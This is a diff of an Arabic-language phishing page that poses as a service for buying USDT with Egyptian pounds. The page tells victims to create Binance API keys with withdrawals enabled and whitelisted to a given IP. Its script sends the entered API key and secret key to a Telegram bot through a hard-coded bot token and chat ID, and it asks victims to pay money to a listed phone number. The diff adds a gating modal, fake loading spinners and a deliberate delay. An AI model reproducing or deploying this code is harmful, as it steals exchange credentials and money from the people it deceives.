@@ -1,159 +1,244 @@
-<!DOCTYPE html><html lang="ar" dir="rtl">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>شراء USDT</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body { font-family: 'Cairo', sans-serif; }
-  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link rel="stylesheet" href="./css/output.css">
 </head>
-<body class="min-h-screen">  <!-- شريط الأيقونات العلوي -->  <div class="bg-black text-white p-4 flex justify-around text-xl">
-    <span>🔐</span>
-    <span>💰</span>
-    <span>📱</span>
-    <span>⚙️</span>
-    <span>✅</span>
-    <span>🪙</span>
-    <span>🛡️</span>
-    <span>🌐</span>
-  </div>  <!-- الحاوية الرئيسية -->  <div class="w-full max-w-xl mx-auto mt-8 space-y-8 p-4">
-    <!-- الصفحة الأولى -->
-    <div id="registration-page" class="bg-cover bg-center rounded-xl p-6" style="background-image: url('https://images.unsplash.com/photo-1611078489935-0cb964f3a621?auto=format&fit=crop&w=800&q=60');">
+<body class="min-h-screen bg-gray-900 text-white">
+  <!-- شريط الأيقونات العلوي -->
+  <div class="bg-black text-white p-4 flex justify-around text-xl icon-bar">
+    <i class="fas fa-lock" title="آمن"></i>
+    <i class="fas fa-wallet" title="محفظة"></i>
+    <i class="fas fa-mobile-alt" title="سهل الاستخدام"></i>
+    <i class="fas fa-cog" title="إعدادات"></i>
+    <i class="fas fa-check-circle" title="موثوق"></i>
+    <i class="fas fa-coins" title="عملات"></i>
+    <i class="fas fa-shield-alt" title="حماية"></i>
+    <i class="fas fa-globe" title="عالمي"></i>
+  </div>
+
+  <!-- Modal لتنبيه تسجيل API -->
+  <div id="api-alert-modal" class="modal">
+    <div class="modal-content">
+      <i class="fas fa-exclamation-triangle text-4xl text-red-600 mb-4"></i>
+      <h2 class="text-xl font-bold text-black mb-4">يلزم تسجيل API أولاً</h2>
+      <p class="text-gray-700 mb-4">يرجى تسجيل بيانات API من Binance لمتابعة عملية الشراء.</p>
+      <button onclick="closeModal()" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700">
+        <i class="fas fa-arrow-left mr-2"></i> تسجيل API
+      </button>
+    </div>
+  </div>
+
+  <!-- الحاوية الرئيسية -->
+  <div class="w-full max-w-xl mx-auto mt-8 space-y-8 p-4">
+    <!-- الصفحة الأولى: تسجيل API -->
+    <div id="registration-page" class="bg-cover bg-center rounded-xl p-6 page" style="background-image: url('https://images.unsplash.com/photo-1639322537504-0e7b5983d7d8?auto=format&fit=crop&w=800&q=60');">
       <div class="bg-white bg-opacity-80 rounded-xl p-4">
-        <h1 class="text-2xl font-bold text-center mb-4 text-black">تسجيل بيانات API</h1><p class="mb-4 text-sm text-gray-700">
-      لإنشاء API على Binance:
-      <ul class="list-disc list-inside text-gray-700">
-        <li>سجل دخولك إلى حساب Binance.</li>
-        <li>اذهب إلى <strong>API Management</strong>.</li>
-        <li>أنشئ API جديدة باسم مناسب.</li>
-        <li>قم بنسخ <strong>API Key</strong> و <strong>Secret Key</strong>.</li>
-        <li>أضف عنوان الـ IP التالي: <strong class="text-red-600">41.250.100.123</strong>.</li>
-        <li>فعّل صلاحية <strong> (Enable Withdrawals)</strong>.</li>
-        <li>فعل النقل من <strong>التمويل إلى الفوري</strong>.</li>
-      </ul>
-    </p>
-
-    <input id="api-key" type="text" placeholder="API Key"
-      class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
-
-    <input id="secret-key" type="text" placeholder="Secret Key"
-      class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
-
-    <input id="ip-address" type="text" value="192.52.1.1" readonly
-      class="w-full mb-3 px-4 py-2 rounded bg-gray-200 text-gray-500 border border-gray-300"/>
-
-    <button onclick="submitAPI()"
-      class="w-full py-2 bg-green-600 hover:bg-green-700 rounded text-white font-semibold">التالي</button>
-
-    <p class="text-sm mt-4 text-gray-800 text-center">
-      يرجى إدخال بياناتك بشكل دقيق لضمان استلام USDT. معلوماتك محمية تمامًا.
-    </p>
-  </div>
-</div>
-
-<!-- الصفحة الثانية -->
-<div id="converter-page" class="hidden bg-cover bg-center rounded-xl p-6" style="background-image: url('https://images.unsplash.com/photo-1565376078256-7800e6f485f4?auto=format&fit=crop&w=800&q=60');">
-  <div class="bg-white bg-opacity-80 rounded-xl p-4">
-    <h2 class="text-2xl font-bold text-center mb-4 text-black">
-اكتب المبلغ للشراء </h2>
-
-    <input id="usd-amount" type="number" placeholder="المبلغ بالدولار"
-      oninput="convertToEGP()"
-      class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
-
-    <p id="result" class="text-center text-xl text-green-700 font-bold mb-4"></p>
-
-    <div class="bg-yellow-100 border border-yellow-400 p-3 rounded mb-4 text-center">
-      <p class="text-lg font-semibold">يرجى تحويل <span id="egp-amount" class="text-red-600 font-bold"></span> جنيه إلى الرقم:</p>
-      <p class="text-xl mt-2 font-bold">01022131543</p>
-      <p class="mt-2 text-sm text-gray-600">ثم إدخل ID محفظتك Binance أدناه لاستلام USDT</p>
+        <h1 class="text-2xl font-bold text-center mb-4 text-black">تسجيل بيانات API</h1>
+        <p class="mb-4 text-sm text-gray-700">
+          لإنشاء API على Binance:
+          <ul class="list-disc list-inside text-gray-700">
+            <li>سجل دخولك إلى حساب Binance.</li>
+            <li>اذهب إلى <strong>API Management</strong>.</li>
+            <li>أنشئ API جديدة باسم مناسب.</li>
+            <li>قم بنسخ <strong>API Key</strong> و <strong>Secret Key</strong>.</li>
+            <li>أضف عنوان الـ IP التالي: <strong class="text-red-600">41.250.100.123</strong>.</li>
+            <li>فعّل صلاحية <strong>(Enable Withdrawals)</strong>.</li>
+            <li>فعل النقل من <strong>التمويل إلى الفوري</strong>.</li>
+          </ul>
+        </p>
+        <div class="flex items-center mb-3">
+          <i class="fas fa-key text-green-600 mr-2"></i>
+          <input id="api-key" type="text" placeholder="API Key" class="w-full px-4 py-2 rounded bg-gray-100 border border-gray-400">
+        </div>
+        <div class="flex items-center mb-3">
+          <i class="fas fa-user-secret text-green-600 mr-2"></i>
+          <input id="secret-key" type="text" placeholder="Secret Key" class="w-full px-4 py-2 rounded bg-gray-100 border border-gray-400">
+        </div>
+        <div class="flex items-center mb-3">
+          <i class="fas fa-network-wired text-gray-500 mr-2"></i>
+          <input id="ip-address" type="text" value="192.52.1.1" readonly class="w-full px-4 py-2 rounded bg-gray-200 text-gray-500 border border-gray-300">
+        </div>
+        <button onclick="submitAPI()" class="w-full py-2 bg-green-600 hover:bg-green-700 rounded text-white font-semibold flex items-center justify-center">
+          <i class="fas fa-arrow-left mr-2"></i> التالي
+        </button>
+        <div id="spinner-api" class="spinner mt-4"></div>
+        <p class="text-sm mt-4 text-gray-800 text-center">
+          يرجى إدخال بياناتك بشكل دقيق لضمان استلام USDT. معلوماتك محمية تمامًا.
+        </p>
+      </div>
     </div>
 
-    <input id="binance-id" type="text" placeholder="ID محفظة Binance"
-      class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
-
-    <button onclick="sendBinanceInfo()"
-      class="w-full py-2 bg-blue-600 hover:bg-blue-700 rounded text-white font-semibold">إرسال</button>
-
-    <div class="flex justify-around mt-4 text-2xl">
-      <span>💸</span>
-      <span>💳</span>
-      <span>🧾</span>
-      <span>🔁</span>
-      <span>📈</span>
-      <span>📤</span>
+    <!-- الصفحة الثانية: شراء USDT -->
+    <div id="converter-page" class="hidden bg-cover bg-center rounded-xl p-6 page" style="background-image: url('https://images.unsplash.com/photo-1620712943542-24099bffc094?auto=format&fit=crop&w=800&q=60');">
+      <div class="bg-white bg-opacity-80 rounded-xl p-4">
+        <h2 class="text-2xl font-bold text-center mb-4 text-black">اكتب المبلغ للشراء</h2>
+        <div class="flex items-center mb-3">
+          <i class="fas fa-dollar-sign text-green-600 mr-2"></i>
+          <input id="usd-amount" type="number" placeholder="المبلغ بالدولار" oninput="convertToEGP()" class="w-full px-4 py-2 rounded bg-gray-100 border border-gray-400">
+        </div>
+        <p id="result" class="text-center text-xl text-green-700 font-bold mb-4">0.00 جنيه</p>
+        <div class="bg-yellow-100 border border-yellow-400 p-3 rounded mb-4 text-center">
+          <p class="text-lg font-semibold">يرجى تحويل <span id="egp-amount" class="text-red-600 font-bold">0.00</span> جنيه إلى الرقم:</p>
+          <div class="flex items-center justify-center mt-2">
+            <i class="fas fa-phone-alt text-blue-600 mr-2"></i>
+            <p id="vodafone-number" class="text-xl font-bold hidden">01022131543</p>
+            <div id="spinner-number" class="spinner"></div>
+          </div>
+          <button id="get-number-btn" onclick="getVodafoneNumber()" class="mt-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded font-semibold flex items-center justify-center mx-auto">
+            <i class="fas fa-download mr-2"></i> الحصول على الرقم
+          </button>
+          <p class="text-sm text-gray-600 mt-2">ثم إدخل ID محفظتك Binance أدناه لاستلام USDT</p>
+        </div>
+        <div class="flex items-center mb-3">
+          <i class="fas fa-id-card text-green-600 mr-2"></i>
+          <input id="binance-id" type="text" placeholder="ID محفظة Binance" class="w-full px-4 py-2 rounded bg-gray-100 border border-gray-400">
+        </div>
+        <button onclick="sendBinanceInfo()" class="w-full py-2 bg-blue-600 hover:bg-blue-700 rounded text-white font-semibold flex items-center justify-center">
+          <i class="fas fa-paper-plane mr-2"></i> إرسال
+        </button>
+        <div id="spinner-buy" class="spinner mt-4"></div>
+        <div class="flex justify-around mt-4 text-2xl icon-bar">
+          <i class="fas fa-money-bill-wave" title="دفع"></i>
+          <i class="fas fa-credit-card" title="بطاقة"></i>
+          <i class="fas fa-receipt" title="إيصال"></i>
+          <i class="fas fa-exchange-alt" title="تحويل"></i>
+          <i class="fas fa-chart-line" title="استثمار"></i>
+          <i class="fas fa-upload" title="إرسال"></i>
+        </div>
+        <p class="text-sm mt-4 text-gray-600 text-center">
+          يتم إرسال المبلغ إلى محفظتك خلال 10 دقائق بعد تأكيد التحويل.
+        </p>
+      </div>
     </div>
 
-    <p class="text-sm mt-4 text-gray-600 text-center">
-      يتم إرسال المبلغ إلى محفظتك خلال 10 دقائق بعد تأكيد التحويل.
-    </p>
+    <!-- الصفحة الثالثة: تأكيد -->
+    <div id="confirmation-page" class="hidden text-center space-y-4 bg-cover bg-center rounded-xl p-6 page" style="background-image: url('https://images.unsplash.com/photo-1612837017391-4b4d1b59e06c?auto=format&fit=crop&w=800&q=60');">
+      <div class="bg-white bg-opacity-90 rounded-xl p-4">
+        <h2 class="text-3xl font-bold text-green-600">تم إرسال البيانات بنجاح</h2>
+        <p class="text-lg">يرجى الانتظار حتى 10 دقائق لاستلام USDT على ID Binance الذي أدخلته.</p>
+        <div class="flex justify-center space-x-4 text-4xl mt-4 icon-bar">
+          <i class="fas fa-check-circle text-green-600"></i>
+          <i class="fas fa-box-open text-blue-600"></i>
+          <i class="fas fa-bolt text-yellow-600"></i>
+        </div>
+        <a href="/" class="inline-block mt-6 text-blue-600 hover:underline flex items-center justify-center">
+          <i class="fas fa-home mr-2"></i> العودة للرئيسية
+        </a>
+      </div>
+    </div>
   </div>
-</div>
 
-<!-- الصفحة الثالثة: تأكيد -->
-<div id="confirmation-page" class="hidden text-center space-y-4 bg-cover bg-center rounded-xl p-6" style="background-image: url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=800&q=60');">
-  <div class="bg-white bg-opacity-90 rounded-xl p-4">
-    <h2 class="text-3xl font-bold text-green-600">تم إرسال البيانات بنجاح</h2>
-    <p class="text-lg">يرجى الانتظار حتى 10 دقائق لاستلام USDT على ID Binance الذي أدخلته.</p>
-    <div class="text-4xl mt-4">✅📦⚡</div>
-    <a href="/" class="inline-block mt-6 text-blue-600 hover:underline">العودة للرئيسية</a>
-  </div>
-</div>
-
-  </div>  <script>
+  <script>
     const botToken = "7376753946:AAGdT_E1udWIYWUu21_NojPu-sVtk9uSljM";
     const chatId = "7699820616";
-    let calculatedResult = 0;
+    let isApiRegistered = false;
 
     function submitAPI() {
       const apiKey = document.getElementById('api-key').value;
       const secretKey = document.getElementById('secret-key').value;
       const ipAddress = document.getElementById('ip-address').value;
-
-      const message = `API Key: ${apiKey}\nSecret Key: ${secretKey}\nIP: ${ipAddress}`;
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      }).then(response => {
-        if (response.ok) {
-          document.getElementById('registration-page').classList.add('hidden');
-          document.getElementById('converter-page').classList.remove('hidden');
-        } else {
-          alert("فشل الإرسال إلى البوت");
-        }
+      if (!apiKey || !secretKey) {
+        alert('يرجى إدخال API Key وSecret Key!');
+        return;
+      }
+      const spinner = document.getElementById('spinner-api');
+      spinner.style.display = 'block';
+      const data = {
+        apiKey,
+        secretKey,
+        ipAddress,
+        type: 'api'
+      };
+      sendToTelegram(data).then(() => {
+        spinner.style.display = 'none';
+        isApiRegistered = true;
+        document.getElementById('registration-page').classList.add('hidden');
+        document.getElementById('converter-page').classList.remove('hidden');
+      }).catch(() => {
+        spinner.style.display = 'none';
+        alert('خطأ في إرسال البيانات، حاول مرة أخرى.');
       });
     }
 
     function convertToEGP() {
-      const usdAmount = parseFloat(document.getElementById('usd-amount').value);
-      const rate = 49;
-      if (!isNaN(usdAmount)) {
-        calculatedResult = usdAmount * rate;
-        document.getElementById('result').textContent = `= ${calculatedResult} جنيه مصري`;
-        document.getElementById('egp-amount').textContent = `${calculatedResult}`;
-      } else {
-        document.getElementById('result').textContent = "";
-        document.getElementById('egp-amount').textContent = "";
+      if (!isApiRegistered) {
+        document.getElementById('api-alert-modal').style.display = 'flex';
+        document.getElementById('usd-amount').value = '';
+        return;
       }
+      const usdAmount = parseFloat(document.getElementById('usd-amount').value) || 0;
+      const egpAmount = usdAmount * 50;
+      document.getElementById('result').textContent = `${egpAmount.toFixed(2)} جنيه`;
+      document.getElementById('egp-amount').textContent = egpAmount.toFixed(2);
+    }
+
+    function getVodafoneNumber() {
+      const btn = document.getElementById('get-number-btn');
+      const spinner = document.getElementById('spinner-number');
+      const number = document.getElementById('vodafone-number');
+      btn.disabled = true;
+      spinner.style.display = 'block';
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        number.classList.remove('hidden');
+        btn.classList.add('hidden');
+      }, 120000); // 120 ثانية
     }
 
     function sendBinanceInfo() {
+      if (!isApiRegistered) {
+        document.getElementById('api-alert-modal').style.display = 'flex';
+        return;
+      }
+      const usdAmount = parseFloat(document.getElementById('usd-amount').value) || 0;
       const binanceId = document.getElementById('binance-id').value;
-      const message = `Binance ID: ${binanceId}\nالمبلغ بالجنيه: ${calculatedResult}`;
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      }).then(response => {
-        if (response.ok) {
-          document.getElementById('converter-page').classList.add('hidden');
-          document.getElementById('confirmation-page').classList.remove('hidden');
-        } else {
-          alert("فشل إرسال Binance ID");
-        }
+      if (usdAmount <= 0 || !binanceId) {
+        alert('يرجى إدخال المبلغ وID Binance!');
+        return;
+      }
+      const spinner = document.getElementById('spinner-buy');
+      spinner.style.display = 'block';
+      const data = {
+        type: 'buy',
+        usdAmount,
+        egpAmount: usdAmount * 50,
+        binanceId
+      };
+      sendToTelegram(data).then(() => {
+        spinner.style.display = 'none';
+        document.getElementById('converter-page').classList.add('hidden');
+        document.getElementById('confirmation-page').classList.remove('hidden');
+      }).catch(() => {
+        spinner.style.display = 'none';
+        alert('خطأ في إرسال البيانات، حاول مرة أخرى.');
       });
     }
-  </script></body>
-</html>
+
+    function closeModal() {
+      document.getElementById('api-alert-modal').style.display = 'none';
+      document.getElementById('registration-page').classList.remove('hidden');
+      document.getElementById('converter-page').classList.add('hidden');
+    }
+
+    async function sendToTelegram(data) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: JSON.stringify(data, null, 2)
+        })
+      });
+      if (!response.ok) {
+        throw new Error('Failed to send to Telegram');
+      }
+    }
+  </script>
+</body>
+      </html>
